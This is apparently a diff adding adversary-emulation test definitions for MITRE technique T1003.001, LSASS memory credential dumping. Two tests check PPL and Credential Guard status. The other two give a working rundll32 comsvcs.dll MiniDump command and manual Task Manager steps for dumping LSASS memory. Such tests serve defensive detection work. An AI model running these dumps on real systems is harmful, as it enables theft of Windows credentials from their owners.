@@ -1,0 +1,62 @@
+attack_technique: T1003.001
+display_name: "OS Credential Dumping: LSASS Memory"
+tactic: Credential Access
+atomic_tests:
+  - name: "LSASS Memory Protection Status Check"
+    auto_generated_guid: d2d2e2f2a3b3c3d3e3f3a4b4c4d4e4f4
+    description: |
+      Checks if LSASS is running as a protected process (PPL).
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      command: |
+        $lsass = Get-Process lsass -ErrorAction SilentlyContinue
+        if ($lsass) { Write-Output "LSASS PID: $($lsass.Id)"; Write-Output "LSASS Protection: $(if ((Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL -eq 1) {'Enabled (PPL)'} else {'Disabled'})" }
+        Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -ErrorAction SilentlyContinue | Select-Object RunAsPPL,LimitBlankPasswordUse
+      elevation_required: false
+
+  - name: "Credential Guard Status Check"
+    auto_generated_guid: e3e3f3a4b4c4d4e4f4a5b5c5d5e5f5a6
+    description: |
+      Checks if Credential Guard is protecting LSASS credentials.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      command: |
+        $dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root/Microsoft/Windows/DeviceGuard -ErrorAction SilentlyContinue
+        if ($dg) { Write-Output "VBS Status: $($dg.VirtualizationBasedSecurityStatus)"; Write-Output "Security Services Running: $($dg.SecurityServicesRunning -join ', ')" }
+        else { Write-Output "Device Guard WMI class not available" }
+      elevation_required: false
+
+  - name: "LSASS Dump via comsvcs.dll (MiniDump)"
+    auto_generated_guid: f4f4a5b5c5d5e5f5a6b6c6d6e6f6a7b7
+    description: |
+      Uses comsvcs.dll MiniDump to create an LSASS memory dump.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      command: |
+        $lsassPid = (Get-Process lsass).Id
+        rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid $env:TEMP\lsass_dump.dmp full
+      cleanup_command: |
+        Remove-Item $env:TEMP\lsass_dump.dmp -Force -ErrorAction SilentlyContinue
+      elevation_required: true
+
+  - name: "LSASS Dump via Task Manager (Manual)"
+    auto_generated_guid: a5a5b5c5d5e5f5a6b6c6d6e6f6a7b7c7
+    description: |
+      Describes manual process to dump LSASS via Task Manager.
+    supported_platforms:
+      - windows
+    executor:
+      name: manual
+      steps: |
+        1. Open Task Manager (Ctrl+Shift+Esc)
+        2. Go to Details tab
+        3. Find lsass.exe
+        4. Right-click > Create dump file
+        5. Note the dump file location
+      elevation_required: true
